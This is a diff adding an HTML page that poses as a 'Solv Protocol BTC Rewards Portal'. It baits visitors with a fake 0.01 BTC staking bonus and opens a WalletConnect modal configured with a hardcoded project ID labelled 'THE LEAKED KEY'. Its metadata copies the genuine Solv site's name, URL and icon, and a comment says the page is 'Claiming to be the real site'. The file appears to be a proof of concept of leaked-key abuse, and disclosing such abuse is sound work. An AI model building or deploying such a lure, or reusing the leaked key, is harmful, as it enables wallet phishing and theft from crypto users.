@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head><title>Claim Your Solv Rewards</title></head>
+<body>
+    <h1>Solv Protocol - BTC Rewards Portal</h1>
+    <p>Connect your wallet to claim your 0.01 BTC staking bonus.</p>
+    <button id="connect-button">Connect Wallet</button>
+
+    <script type="module">
+        import { createWeb3Modal, defaultWagmiConfig } from 'https://unpkg.com/@web3modal/wagmi@3.5.0/dist/index.js'
+        import { mainnet } from 'https://unpkg.com/viem/chains'
+
+        // THE LEAKED KEY
+        const projectId = '_gg7wSSi0KMBsdKnGVfHDueq6xMB9EkC';
+
+        const metadata = {
+            name: 'Solv Protocol',
+            description: 'Solv Finance App',
+            url: 'https://app.solv.finance', // Claiming to be the real site
+            icons: ['https://solv.finance/favicon.ico']
+        }
+
+        const chains = [mainnet]
+        const wagmiConfig = defaultWagmiConfig({ chains, projectId, metadata })
+
+        const modal = createWeb3Modal({ wagmiConfig, projectId, chains })
+
+        document.getElementById('connect-button').addEventListener('click', () => {
+            modal.open()
+        })
+    </script>
+</body>
+</html>
